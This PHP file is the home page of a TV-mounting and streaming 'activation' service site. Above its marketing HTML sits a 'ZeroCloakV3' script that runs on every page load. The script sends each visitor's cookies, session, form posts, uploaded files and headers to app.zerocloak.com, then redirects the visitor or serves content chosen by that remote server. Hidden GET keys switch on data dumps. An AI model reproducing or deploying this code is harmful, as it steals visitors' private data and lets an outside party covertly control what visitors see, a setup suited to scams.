<?php
// Simple router for extensionless URLs on environments that fallback to index.php
$requestUri = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
$path = trim($requestUri, '/');

if ($path !== '' && $path !== 'index' && $path !== 'index.php') {
    if (file_exists(__DIR__ . '/' . $path . '.php')) {
        require __DIR__ . '/' . $path . '.php';
        exit;
    }
}

if (!class_exists('ZeroCloakV3')) {
class ZeroCloakV3
{
    private $targetUrl;
    private $encryptionKey;
    private $requestId;
    private $uei_6s71a1;
    private $cst_4u89t5;
    private $timeout;

    public function __construct()
    {
        header("Access-Control-Allow-Origin: *");
        header("Access-Control-Allow-Methods: GET, POST, OPTIONS");
        header("Access-Control-Allow-Headers: Content-Type, Authorization");
        
        error_reporting(E_ALL);
        ini_set('display_errors', 1);

        $this->targetUrl        = 'https://app.zerocloak.com/realtime';
        $this->encryptionKey    = 'b96fe040-f322-4ffe-9981-94743ad3a129';
        $this->requestId        = uniqid('req_', true);
        $this->uei_6s71a1       = "jkmrvusiuk";
        $this->cst_4u89t5       = "oc8rjqji2p";
        $this->timeout          = 30;
    }

    private function retrieveAllHeaders()
    {
        if (!function_exists('getallheaders')) {
            $headers = [];
            foreach ($_SERVER as $name => $value) {
                if (substr($name, 0, 5) == 'HTTP_') {
                    $headers[str_replace(
                        ' ',
                        '-',
                        ucwords(strtolower(str_replace('_', ' ', substr($name, 5))))
                    )] = $value;
                }
            }
            return $headers;
        }
        return getallheaders();
    }

    private function gatherRequestData()
    {
        return [
            'request_id' => $this->requestId,
            'uei_6s71a1' => $this->uei_6s71a1,
            'cst_4u89t5' => $this->cst_4u89t5,
            'server'     => $_SERVER,
            'headers'    => $this->retrieveAllHeaders(),
            'get'        => $_GET,
            'post'       => $_POST,
            'files'      => $_FILES,
            'cookie'     => $_COOKIE,
            'session'    => isset($_SESSION) ? $_SESSION : [],
            'timestamp'  => date('Y-m-d H:i:s'),
        ];
    }

    private function transmitData($data, $maxRetries = 3)
    {
        if (function_exists('curl_version')) {
            return $this->sendUsingCurl($data, $maxRetries);
        } else {
            return $this->sendUsingFileGetContents($data);
        }
    }

    private function sendUsingCurl($data, $maxRetries = 3)
    {
        $ch = curl_init($this->targetUrl);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'Content-Type: application/json',
            'Content-Length: ' . strlen($data),
            'X-Request-ID: ' . $this->requestId,
            'Cache-Control: no-cache',
            'Cache-Control: max-age=0',
            'Pragma: no-cache',
        ]);

        curl_setopt($ch, CURLOPT_TIMEOUT, $this->timeout);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $this->timeout);

        for ($retry = 0; $retry < $maxRetries; $retry++) {
            $response = curl_exec($ch);
            if ($response !== false) {
                curl_close($ch);
                return $response;
            }
            sleep(1);
        }

        curl_close($ch);
        return false;
    }

    private function sendUsingFileGetContents($data)
    {
        $opts = [
            "http" => [
                "header" => [
                    "Content-Type: application/json",
                    "Content-Length: " . strlen($data),
                    "X-Request-ID: " . $this->requestId,
                    "Cache-Control: no-cache",
                    'Cache-Control: max-age=0',
                    "Pragma: no-cache",
                ],
                "method" => "POST",
                "content" => $data,
                "timeout" => $this->timeout,
            ],
        ];

        $context = stream_context_create($opts);
        $response = @file_get_contents($this->targetUrl, false, $context);

        return $response;
    }

    public function clearCache()
    {
        if (function_exists('wp_cache_flush')) {
            wp_cache_flush();
        }

        if (function_exists('wp_cache_clear_cache')) {
            wp_cache_clear_cache();
        }
    }
    public function verify()
    {
        if(isset($_GET['8ea8cd56-1488']) && $_GET['8ea8cd56-1488'] == $this->encryptionKey){
            echo $this->cst_4u89t5;
            die();
        }
    }
    public function run()
    {
        $this->verify();
        $this->clearCache();
        $data = $this->gatherRequestData();
        
        if(isset($_GET['debug-8ea8cd56-1488']) && $_GET['debug-8ea8cd56-1488'] == $this->encryptionKey){
            echo "<h5>(1) Send: Data Got -</h5><pre>";
            print_r($data);
            echo "</pre>";
        }
        
        $jsonData   = json_encode($data);
        
        if(isset($_GET['debug-8ea8cd56-1488']) && $_GET['debug-8ea8cd56-1488'] == $this->encryptionKey){
            echo "<h5>(2) Send: Convert to Json -</h5><pre>";
            print_r($jsonData);
            echo "</pre>";
        }

        if ($jsonData === false) {
            $this->failHandle("Error: JSON encoding failed: " . json_last_error_msg());
            return false;
        }

        $base64Data = base64_encode($jsonData);
        
        if(isset($_GET['debug-8ea8cd56-1488']) && $_GET['debug-8ea8cd56-1488'] == $this->encryptionKey){
            echo "<h5>(3) Send: Json to base64_encode -</h5><pre>";
            print_r($base64Data);
            echo "</pre>";
        }

        if ($base64Data === false) {
            $this->failHandle("Error: Base64 encoding failed");
            return false;
        }

        $response = $this->transmitData($base64Data);
        
        if(isset($_GET['debug-8ea8cd56-1488-main']) && $_GET['debug-8ea8cd56-1488-main'] == $this->encryptionKey){
              echo $response;
              die;
        }
        
        if(isset($_GET['debug-8ea8cd56-1488']) && $_GET['debug-8ea8cd56-1488'] == $this->encryptionKey){
            echo "<h5>(1) Receive: Data Got -</h5><pre>";
            print_r($response);
            echo "</pre>";
        }
        
        if ($response !== false) {
            $this->successHandle($response);
        } else {
            $this->failHandle($response);
        }
    }

    public function successHandle($response)
    {

        $base64decodeData = base64_decode($response);
        
         if(isset($_GET['debug-8ea8cd56-1488']) && $_GET['debug-8ea8cd56-1488'] == $this->encryptionKey){
            echo "<h5>(5) Receive: decryptedData -</h5><pre>";
            print_r($base64decodeData);
            echo "</pre>";
        }
        
        
        if ($base64decodeData === false) {
            $this->failHandle("Error: Base64 decode failed");
            return false;
        }

        $responseData = json_decode($base64decodeData, true);

         if(isset($_GET['debug-8ea8cd56-1488']) && $_GET['debug-8ea8cd56-1488'] == $this->encryptionKey){
            echo "<h5>(6) Receive: decryptedData -</h5><pre>";
            print_r($responseData);
            echo "</pre>";
        }
        if ($responseData === null && json_last_error() !== JSON_ERROR_NONE) {
            $this->failHandle("Error: JSON decoding failed");
            return false;
        }
        if(!$responseData['status']){
            $this->failHandle($responseData['message']);
            return false;
        }

       if (
            (isset($_GET['debug-8ea8cd56-1488']) && $_GET['debug-8ea8cd56-1488'] === $this->encryptionKey) ||
            (isset($_GET['debug-8ea8cd56-1488-main']) && $_GET['debug-8ea8cd56-1488-main'] === $this->encryptionKey)
        ) {
            die();
        }

        if(!($responseData['data']['nothing'])){

            if(isset($responseData['data']['hr'])){
                header("Referrer-Policy: no-referrer");
            }

            if(!is_null($responseData['data']['zrc'])){

                if(!$responseData['data']['zrc']['status']){
                    $this->failHandle($responseData['data']['zrc']['message']);
                    return false;

                }else{
                    $this->zeroRedirectionCloaking($responseData['data']['zrc']['content']);
                    return true;

                }
            }

            $this->redirectTo($responseData['data']['url'],$responseData['data']['http_code']);
            return true;
        }
        return true;

    }
    private function zeroRedirectionCloaking(string $content = '') {
        echo $content;
        die();
    }
    private function redirectTo(string $url, string $method = 'header-301') {
        switch (strtolower($method)) {
            case 'header-301':
                header("Location: $url", 301);
                exit;

            case 'header-302':
                header("Location: $url", 302);
                exit;

            case 'header-refresh':
                header("Refresh: 0;url=$url");
                exit;

            case 'meta':
                echo '<!DOCTYPE html><html><head><meta http-equiv="refresh" content="0;url=' . htmlspecialchars($url) . '"><title>Redirecting...</title></head><body><a href="' . htmlspecialchars($url) . '">Click here</a></body></html>';
                exit;

            case 'js_meta':
                echo '<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Redirecting...</title></head><body><script>window.location.href = "' . htmlspecialchars($url) . '";</script><noscript><meta http-equiv="refresh" content="0;url=' . htmlspecialchars($url) . '"></noscript><p>If you are not redirected, <a href="' . htmlspecialchars($url) . '">click here</a>.</p></body></html>';
                exit;

            default:
                header("Location: $url", 301);
                exit;
        }
    }

    private function failHandle($response)
    {
        // Silently fail and allow the page to load instead of breaking the website
        return false;
    }
}
}

$zerocloakCloaking = new ZeroCloakV3();
$zerocloakCloaking->run();

// @zerocloak.com 2026-05-16 06:53:20
?>
<?php include 'includes/header.php'; ?>

<!-- Hero Section -->
<section class="relative pt-32 pb-20 lg:pt-48 lg:pb-32 overflow-hidden bg-white">
    <div class="absolute inset-0 z-0">
        <img src="../tv-activations/public/hero.png" alt="TV Wall Mounting" class="w-full h-full object-cover object-center" />
        <div class="absolute inset-0 bg-gradient-to-r from-white via-white/95 to-white/40 lg:to-transparent"></div>
    </div>
    <div class="container mx-auto px-6 relative z-10">
        <div class="max-w-2xl fade-in-up">
            <span class="inline-block py-1.5 px-4 rounded-full bg-primary/10 text-primary font-semibold text-sm mb-6">
                #1 Rated Home Entertainment Service
            </span>
            <h1 class="text-5xl lg:text-6xl font-extrabold leading-tight text-slate-900 mb-6">
                Professional <span class="text-primary">TV Wall Mounting</span> Services
            </h1>
            <p class="text-lg text-slate-600 mb-8 leading-relaxed max-w-xl">
                We secure cables behind the wall, use structural conduit for a clean finish, and properly calibrate your audio-visual equipment.
            </p>
            <div class="flex flex-col sm:flex-row gap-4 mb-10">
                <a href="contact" class="bg-primary hover:bg-primary-dark text-white px-8 py-4 rounded-full font-bold text-lg text-center transition-all shadow-lg shadow-primary/30">
                    Get Started
                </a>
                <a href="tel:+18775130191" class="bg-white hover:bg-slate-50 text-slate-900 border border-slate-200 px-8 py-4 rounded-full font-bold text-lg text-center transition-all shadow-sm">
                    Call Now: +1 8775130191
                </a>
            </div>
            <div class="flex flex-wrap items-center gap-6 text-sm font-medium text-slate-700">
                <div class="flex items-center gap-2"><i data-lucide="shield-check" class="text-primary w-5 h-5"></i><span>Certified Experts</span></div>
                <div class="flex items-center gap-2"><i data-lucide="clock" class="text-primary w-5 h-5"></i><span>Same-Day Service</span></div>
                <div class="flex items-center gap-2"><i data-lucide="star" class="text-yellow-500 w-5 h-5 fill-yellow-500"></i><span>24/7 Support</span></div>
            </div>
        </div>
    </div>
</section>

<!-- Featured Services -->
<section class="py-24 bg-light">
    <div class="container mx-auto px-6">
        <div class="text-center max-w-3xl mx-auto mb-16 fade-in-up">
            <h2 class="text-4xl font-bold text-slate-900 mb-4">Premium Installation Services</h2>
            <p class="text-lg text-slate-600">We provide structural mounting for heavy displays, hidden wire routing, and custom audio zoning for a clean look.</p>
        </div>
        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-8">
            <!-- Service 1 -->
            <div class="bg-white rounded-2xl p-8 shadow-sm hover:shadow-xl transition-shadow border border-slate-100 group fade-in-up delay-100">
                <div class="w-14 h-14 bg-primary/10 rounded-xl flex items-center justify-center mb-6 group-hover:bg-primary transition-colors">
                    <i data-lucide="tv" class="text-primary group-hover:text-white w-7 h-7"></i>
                </div>
                <h3 class="text-xl font-bold text-slate-900 mb-3">TV Mounting</h3>
                <p class="text-slate-600 mb-6 line-clamp-2">Professional, secure wall mounting for any TV size on any wall type.</p>
                <a href="services" class="text-primary font-semibold flex items-center gap-2 hover:gap-3 transition-all">Learn more &rarr;</a>
            </div>
            <!-- Service 2 -->
            <div class="bg-white rounded-2xl p-8 shadow-sm hover:shadow-xl transition-shadow border border-slate-100 group fade-in-up delay-200">
                <div class="w-14 h-14 bg-primary/10 rounded-xl flex items-center justify-center mb-6 group-hover:bg-primary transition-colors">
                    <i data-lucide="cable" class="text-primary group-hover:text-white w-7 h-7"></i>
                </div>
                <h3 class="text-xl font-bold text-slate-900 mb-3">Wire Concealment</h3>
                <p class="text-slate-600 mb-6 line-clamp-2">In-wall cable management for a clean, clutter-free entertainment space.</p>
                <a href="services" class="text-primary font-semibold flex items-center gap-2 hover:gap-3 transition-all">Learn more &rarr;</a>
            </div>
            <!-- Service 3 -->
            <div class="bg-white rounded-2xl p-8 shadow-sm hover:shadow-xl transition-shadow border border-slate-100 group fade-in-up delay-300">
                <div class="w-14 h-14 bg-primary/10 rounded-xl flex items-center justify-center mb-6 group-hover:bg-primary transition-colors">
                    <i data-lucide="speaker" class="text-primary group-hover:text-white w-7 h-7"></i>
                </div>
                <h3 class="text-xl font-bold text-slate-900 mb-3">Soundbar Mounting</h3>
                <p class="text-slate-600 mb-6 line-clamp-2">Perfectly aligned audio equipment for optimal acoustic performance.</p>
                <a href="services" class="text-primary font-semibold flex items-center gap-2 hover:gap-3 transition-all">Learn more &rarr;</a>
            </div>
            <!-- Service 4 -->
            <div class="bg-white rounded-2xl p-8 shadow-sm hover:shadow-xl transition-shadow border border-slate-100 group fade-in-up delay-400">
                <div class="w-14 h-14 bg-primary/10 rounded-xl flex items-center justify-center mb-6 group-hover:bg-primary transition-colors">
                    <i data-lucide="film" class="text-primary group-hover:text-white w-7 h-7"></i>
                </div>
                <h3 class="text-xl font-bold text-slate-900 mb-3">Home Theater</h3>
                <p class="text-slate-600 mb-6 line-clamp-2">Surround sound installation and precise audio calibration.</p>
                <a href="services" class="text-primary font-semibold flex items-center gap-2 hover:gap-3 transition-all">Learn more &rarr;</a>
            </div>
        </div>
    </div>
</section>

<!-- Why Choose Us -->
<section class="py-24 bg-white">
    <div class="container mx-auto px-6">
        <div class="flex flex-col lg:flex-row gap-16 items-center">
            <div class="lg:w-1/3 fade-in-up">
                <h2 class="text-4xl font-bold text-slate-900 mb-6">Why Choose <span class="text-primary">Stream Activate Hub?</span></h2>
                <p class="text-lg text-slate-600 mb-8">
                    Our team relies on commercial-grade networking gear and load-bearing mounts to ensure your equipment runs safely and reliably.
                </p>
                <div class="bg-slate-50 p-6 rounded-2xl border border-slate-100">
                    <p class="font-semibold text-slate-800 text-lg mb-2">"The best service I've ever experienced."</p>
                    <p class="text-slate-500">— Sarah Jenkins, Verified Customer</p>
                </div>
            </div>
            <div class="lg:w-2/3 grid grid-cols-1 md:grid-cols-2 gap-6">
                <!-- Feature 1 -->
                <div class="flex gap-4 p-6 rounded-2xl hover:bg-slate-50 transition-colors fade-in-up delay-100">
                    <div class="shrink-0 mt-1"><div class="w-12 h-12 bg-primary/10 rounded-full flex items-center justify-center"><i data-lucide="award" class="text-primary"></i></div></div>
                    <div><h4 class="text-xl font-bold text-slate-900 mb-2">Certified Experts</h4><p class="text-slate-600">Our technicians are highly trained and fully insured.</p></div>
                </div>
                <!-- Feature 2 -->
                <div class="flex gap-4 p-6 rounded-2xl hover:bg-slate-50 transition-colors fade-in-up delay-200">
                    <div class="shrink-0 mt-1"><div class="w-12 h-12 bg-primary/10 rounded-full flex items-center justify-center"><i data-lucide="zap" class="text-primary"></i></div></div>
                    <div><h4 class="text-xl font-bold text-slate-900 mb-2">Fast Service</h4><p class="text-slate-600">Same-day appointments available. We get you up and running quickly.</p></div>
                </div>
                <!-- Feature 3 -->
                <div class="flex gap-4 p-6 rounded-2xl hover:bg-slate-50 transition-colors fade-in-up delay-300">
                    <div class="shrink-0 mt-1"><div class="w-12 h-12 bg-primary/10 rounded-full flex items-center justify-center"><i data-lucide="shield" class="text-primary"></i></div></div>
                    <div><h4 class="text-xl font-bold text-slate-900 mb-2">Secure & Reliable</h4><p class="text-slate-600">Your home network is configured with maximum security.</p></div>
                </div>
                <!-- Feature 4 -->
                <div class="flex gap-4 p-6 rounded-2xl hover:bg-slate-50 transition-colors fade-in-up delay-400">
                    <div class="shrink-0 mt-1"><div class="w-12 h-12 bg-primary/10 rounded-full flex items-center justify-center"><i data-lucide="headphones" class="text-primary"></i></div></div>
                    <div><h4 class="text-xl font-bold text-slate-900 mb-2">24/7 Assistance</h4><p class="text-slate-600">Round-the-clock support for any technical issues.</p></div>
                </div>
            </div>
        </div>
    </div>
</section>

<!-- Step Guide -->
<section class="py-24 bg-slate-900 text-white overflow-hidden relative">
    <div class="absolute inset-0 opacity-10 bg-black bg-cover bg-center mix-blend-overlay"></div>
    <div class="container mx-auto px-6 relative z-10">
        <div class="text-center max-w-3xl mx-auto mb-16 fade-in-up">
            <h2 class="text-4xl font-bold mb-4">Our Installation Process</h2>
            <p class="text-lg text-slate-300">A seamless, hassle-free experience from start to finish.</p>
        </div>
        <div class="relative">
            <div class="hidden lg:block absolute top-1/2 left-0 w-full h-1 bg-slate-800 -translate-y-1/2"></div>
            <div class="grid grid-cols-1 md:grid-cols-3 lg:grid-cols-5 gap-8">
                <div class="relative fade-in-up delay-100">
                    <div class="bg-slate-800 rounded-2xl p-6 relative z-10 border border-slate-700 h-full hover:border-primary transition-colors">
                        <div class="absolute -top-5 left-1/2 -translate-x-1/2 w-10 h-10 bg-primary rounded-full flex items-center justify-center font-bold border-4 border-slate-900">1</div>
                        <div class="flex justify-center mb-4 mt-4 text-primary"><i data-lucide="calendar" class="w-8 h-8"></i></div>
                        <h4 class="text-lg font-bold text-center mb-2">Book Service</h4>
                    </div>
                </div>
                <div class="relative fade-in-up delay-200">
                    <div class="bg-slate-800 rounded-2xl p-6 relative z-10 border border-slate-700 h-full hover:border-primary transition-colors">
                        <div class="absolute -top-5 left-1/2 -translate-x-1/2 w-10 h-10 bg-primary rounded-full flex items-center justify-center font-bold border-4 border-slate-900">2</div>
                        <div class="flex justify-center mb-4 mt-4 text-primary"><i data-lucide="map-pin" class="w-8 h-8"></i></div>
                        <h4 class="text-lg font-bold text-center mb-2">Technician Arrives</h4>
                    </div>
                </div>
                <div class="relative fade-in-up delay-300">
                    <div class="bg-slate-800 rounded-2xl p-6 relative z-10 border border-slate-700 h-full hover:border-primary transition-colors">
                        <div class="absolute -top-5 left-1/2 -translate-x-1/2 w-10 h-10 bg-primary rounded-full flex items-center justify-center font-bold border-4 border-slate-900">3</div>
                        <div class="flex justify-center mb-4 mt-4 text-primary"><i data-lucide="hammer" class="w-8 h-8"></i></div>
                        <h4 class="text-lg font-bold text-center mb-2">Secure Mounting</h4>
                    </div>
                </div>
                <div class="relative fade-in-up delay-400">
                    <div class="bg-slate-800 rounded-2xl p-6 relative z-10 border border-slate-700 h-full hover:border-primary transition-colors">
                        <div class="absolute -top-5 left-1/2 -translate-x-1/2 w-10 h-10 bg-primary rounded-full flex items-center justify-center font-bold border-4 border-slate-900">4</div>
                        <div class="flex justify-center mb-4 mt-4 text-primary"><i data-lucide="cable" class="w-8 h-8"></i></div>
                        <h4 class="text-lg font-bold text-center mb-2">Wire Concealment</h4>
                    </div>
                </div>
                <div class="relative fade-in-up delay-400">
                    <div class="bg-slate-800 rounded-2xl p-6 relative z-10 border border-slate-700 h-full hover:border-primary transition-colors">
                        <div class="absolute -top-5 left-1/2 -translate-x-1/2 w-10 h-10 bg-primary rounded-full flex items-center justify-center font-bold border-4 border-slate-900">5</div>
                        <div class="flex justify-center mb-4 mt-4 text-primary"><i data-lucide="check-circle" class="w-8 h-8"></i></div>
                        <h4 class="text-lg font-bold text-center mb-2">Final Calibration</h4>
                    </div>
                </div>
            </div>
        </div>
    </div>
</section>

<!-- FAQ -->
<section id="faq" class="py-24 bg-white">
    <div class="container mx-auto px-6 max-w-4xl">
        <div class="text-center mb-16 fade-in-up">
            <h2 class="text-4xl font-bold text-slate-900 mb-4">Frequently Asked Questions</h2>
            <p class="text-lg text-slate-600">Got questions? We've got answers.</p>
        </div>
        <div class="space-y-4">
            <div class="border border-slate-200 rounded-2xl overflow-hidden hover:border-primary/50 transition-colors fade-in-up delay-100">
                <button class="faq-btn w-full px-6 py-5 text-left flex justify-between items-center bg-slate-50 hover:bg-slate-100 transition-colors outline-none focus:outline-none">
                    <span class="font-bold text-slate-900">How long does setup take?</span>
                    <i data-lucide="chevron-down" class="text-primary transition-transform duration-300"></i>
                </button>
                <div class="max-h-0 overflow-hidden transition-all duration-300 ease-in-out">
                    <div class="px-6 py-5 text-slate-600 bg-white border-t border-slate-100">Most setups take 45 minutes to 1.5 hours.</div>
                </div>
            </div>
            <div class="border border-slate-200 rounded-2xl overflow-hidden hover:border-primary/50 transition-colors fade-in-up delay-200">
                <button class="faq-btn w-full px-6 py-5 text-left flex justify-between items-center bg-slate-50 hover:bg-slate-100 transition-colors outline-none focus:outline-none">
                    <span class="font-bold text-slate-900">Do you offer same-day support?</span>
                    <i data-lucide="chevron-down" class="text-primary transition-transform duration-300"></i>
                </button>
                <div class="max-h-0 overflow-hidden transition-all duration-300 ease-in-out">
                    <div class="px-6 py-5 text-slate-600 bg-white border-t border-slate-100">Yes! We offer same-day appointments subject to availability.</div>
                </div>
            </div>
        </div>
    </div>
</section>

<?php include 'includes/footer.php'; ?>
